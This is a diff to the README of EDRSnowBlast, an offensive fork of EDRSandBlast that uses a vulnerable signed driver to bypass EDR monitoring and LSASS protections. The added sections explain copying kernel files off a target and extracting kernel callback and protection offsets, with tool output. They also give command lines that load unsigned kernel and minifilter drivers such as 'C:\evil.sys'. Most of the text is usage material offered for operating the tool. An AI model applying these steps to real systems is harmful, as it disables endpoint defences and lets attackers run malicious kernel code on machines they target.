@@ -2,18 +2,18 @@
 
 ## Description  
 
-**`EDRSnowBlast`** is a fork of `EDRSandBlast` project from   
-[Thomas DIOT (Qazeer)](https://github.com/Qazeer/)
-[Maxime MEIGNAN (themaks)](https://github.com/themaks)
+**`EDRSnowBlast`** is a fork of `EDRSandBlast` project [https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) from [Thomas DIOT (Qazeer)](https://github.com/Qazeer/) and [Maxime MEIGNAN (themaks)](https://github.com/themaks)
 
-`EDRSandBlast` is a tool written in `C` that weaponize a vulnerable signed
+[`EDRSandBlast` is a tool written in `C` that weaponize a vulnerable signed
 driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks
 and `ETW TI` provider) and `LSASS` protections. Multiple userland unhooking
-techniques are also implemented to evade userland monitoring.
+techniques are also implemented to evade userland monitoring.]
 
-`EDRSnowBlast` has the following differences :  
+
+  
+**`EDRSnowBlast`** has the following differences :  
 - Add new Windows version validation method
-- Add new driver support
+- Add new driver support : GDRV.sys
 - Add feature : loading unsigned kernel driver
 - Add feature : loading unsigned minifilter driver
 - Add feature "filter-enum" for minifilter enumeration process
@@ -23,7 +23,7 @@ techniques are also implemented to evade userland monitoring.
 
 More information on EDRSnowBlast : [https://v1k1ngfr.github.io/edrsnowblast/](https://v1k1ngfr.github.io/edrsnowblast/)  
 
-More information on "filter-mute" : [TODO](TODO)  
+More information on "filter-mute" : [TODO : Add dedicated blogpost](TODO)  
 
 ## Usage
 
@@ -156,10 +156,69 @@ options:
   -d, --download        Flag to download the PE from Microsoft servers using list of versions from winbindex.m417z.com.
 ```
 
-## Examples  
+## Example : building new offsets CSV files 
 
-You will find below the process of building offsets CSV files for a new Windows target.  
+You will find below the process of building offsets CSV files for a new Windows target. Don't forget to install Radare2. 
 
+### Using external Linux host  
+Note : on Kali Linux Radare2 is installed by default  
+
+1. Exfiltrate files from your target  
+
+```
+c:\>ver
+Microsoft Windows [Version 10.0.19045.3324]
+
+c:\>mkdir z:\10.0.19045.3324
+c:\>copy c:\Windows\System32\ntoskrnl.exe z:\10.0.19045.3324\
+        1 file(s) copied.
+c:\>copy c:\Windows\System32\wdigest.dll z:\10.0.19045.3324\
+        1 file(s) copied.
+c:\>copy c:\Windows\System32\ci.dll z:\10.0.19045.3324\
+        1 file(s) copied.
+c:\>copy c:\Windows\System32\drivers\fltMgr.sys z:\10.0.19045.3324
+        1 file(s) copied.
+```
+
+2. Use python script
+
+```
+──(viking@edrsnowblast)-[/SHARE]
+└─$ export R2_CURL=1
+
+┌──(viking@edrsnowblast)-[/SHARE]
+└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/ntoskrnl.exe ntoskrnl
+[*] Loading the known known PE versions from "NtoskrnlOffsets.csv".
+[+] Loaded 7 known ntoskrnl versions from "NtoskrnlOffsets.csv"
+[*] Processing ntoskrnl version ntoskrnl_19041-3324.exe (file: 10.0.19045.3324/ntoskrnl.exe)
+[+] PspCreateProcessNotifyRoutine = 0xcec620
+[+] PspCreateThreadNotifyRoutine = 0xcec420
+[+] PspLoadImageNotifyRoutine = 0xcec220
+[+] _PS_PROTECTION Protection = 0x87a
+[+] EtwThreatIntProvRegHandle = 0xc19818
+[+] _ETW_GUID_ENTRY* GuidEntry = 0x20
+[+] _TRACE_ENABLE_INFO ProviderEnableInfo = 0x60
+[+] PsProcessType = 0xcfc410
+[+] PsThreadType = 0xcfc440
+[+] struct _LIST_ENTRY CallbackList = 0xc8
+[+] do it : 10.0.19045.3324/ntoskrnl.exe
+3a7bbe1c5fe0cd115ede21a01341f9e2be30b4bdf81feb89e982de5630ce883f
+[+] Finished processing of ntoskrnl 10.0.19045.3324/ntoskrnl.exe!
+
+┌──(viking@edrsnowblast)-[/SHARE]
+└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/wdigest.dll wdigest
+[ snip ]
+
+└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/ci.dll ci
+[ snip ]
+
+└─$ python3 ExtractOffsets.py -i 10.0.19045.3324/fltmgr.sys fltmgr
+[ snip ]
+
+```
+
+
+### Directly on Windows target host
 Generate offsets for a new Windows ci.dll (new file created : CiOffsets.csv)  
 
 ```
@@ -203,11 +262,17 @@ a74ad4d7624fb741b7008711336b37f3a27d96c3ef6361c107155b3bdfd8592b
 [+] Finished processing of fltmgr c:\Windows\System32\drivers\fltMgr.sys!
 ```
 
-Here is an example of loading unsigned Windows kernel (CSV offset files are in the current directory) :  
+## Example : loading unsigned Windows drivers 
+
+Here is an example of loading unsigned Windows kernel driver (CSV offset files are in the current directory) :  
 
 ```
 EDRSnowblast.exe loadk --kernelmode --loadk-file C:\evil.sys --verbose
 ```
 
-More information on [https://v1k1ngfr.github.io/edrsnowblast/](https://v1k1ngfr.github.io/edrsnowblast/)  
+Here is an example of loading unsigned Windows kernel minifilter driver (Minifilter driver should already be installed and CSV offset files are in the current directory) :  
+
+```
+EDRSnowblast.exe loadf --kernelmode --loadf-name myevildriver --verbose
+```
 
